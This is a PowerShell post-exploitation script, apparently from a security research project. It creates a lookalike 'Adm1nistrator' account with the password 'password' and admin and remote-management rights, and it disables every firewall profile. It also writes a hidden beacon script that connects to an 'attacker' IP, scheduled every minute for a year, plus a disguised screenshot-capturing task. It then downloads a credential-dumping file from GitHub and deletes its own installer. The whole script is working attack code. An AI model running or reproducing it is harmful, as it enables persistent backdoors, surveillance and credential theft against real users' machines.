# Make a directory with random name under temp directory for obfuscation
function New-RandomTempDirectory {
    param(
        [int]$Length = 16
    )

    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    $randomName = -join (1..$Length | ForEach-Object {
        $chars[(Get-Random -Maximum $chars.Length)]
    })

    $tempPath = [System.IO.Path]::GetTempPath()
    $fullPath = Join-Path $tempPath $randomName

    New-Item -ItemType Directory -Path $fullPath -Force | Out-Null

    return $fullPath
}


$dirPath = New-RandomTempDirectory

# Create Admin account for persistence
# Run PowerShell as Administrator
$username = "Adm1nistrator"
$password = "password"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

# Check if the local user already exists
$userExists = Get-LocalUser -Name $username -ErrorAction SilentlyContinue

if (-not $userExists) {
    # Create local user
    New-LocalUser -Name $username -Password $securePassword -FullName $username -Description "Local admin account" 
    net user Adm1nistrator /passwordreq:yes
    net user Adm1nistrator /active:yes
    Set-LocalUser -Name "Adm1nistrator" -PasswordNeverExpires $true

    # Add user to Administrators and Remote Management group
    Add-LocalGroupMember -Group "Administrators" -Member $username
    Add-LocalGroupMember -Group "Remote Management Users" -Member $username
    # This is for the current user
    Add-LocalGroupMember -Group "Remote Management Users" -Member $env:USERNAME


    # # Hide user from login screen
    # $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

    # # Create registry path if it does not exist
    # if (-not (Test-Path $regPath)) {
    #     New-Item -Path $regPath -Force | Out-Null
    # }

    # # Set user to hidden (0 = hidden, 1 = visible)
    # New-ItemProperty `
    #     -Path $regPath `
    #     -Name $username `
    #     -PropertyType DWORD `
    #     -Value 0 `
    #     -Force | Out-Null
}

# disable firewalls
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Make a sender file under the random temp folder
$filePath = Join-Path $dirPath "sender.ps1"

@'
$attackerIP = "192.168.0.1"
$port = 1234

for ($i = 0; $i -lt 5; $i++) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($attackerIP, $port)
        $client.Close()
        break
    }
    catch {
        Start-Sleep -Seconds 10
    }
}
'@ | Set-Content -Path $filePath -Encoding UTF8

# Create task schedule for sender.ps1
$taskName   = "RunSenderPS1"

# Check if the scheduled task already exists
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

if (-not $taskExists) {

    $action = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$filePath`""

    $trigger = New-ScheduledTaskTrigger `
        -Once `
        -At (Get-Date) `
        -RepetitionInterval (New-TimeSpan -Minutes 1) `
        -RepetitionDuration (New-TimeSpan -Days 365)

    Register-ScheduledTask `
        -TaskName $taskName `
        -Action $action `
        -Trigger $trigger `
        -RunLevel Highest `
        -Force
    
        schtasks /run /tn "RunSenderPS1"
}


# Scheduled task for screenshot
@'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

$path = "C:\Users\Public\screen.png"
$bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
'@ | Set-Content -Path "C:\Users\Public\screenshot.ps1" -Encoding UTF8

schtasks /create /tn "WindowsDisplayUpdate" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\screenshot.ps1" /sc ONCE /st 00:00 /ru INTERACTIVE /rl HIGHEST

icacls "C:\Windows\System32\Tasks\WindowsDisplayUpdate" /grant Administrators:F

# Download dump.cmd for credential dump
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/dump.cmd' -OutFile "C:\Users\Public\dump.cmd"


    
Remove-Item installer.ps1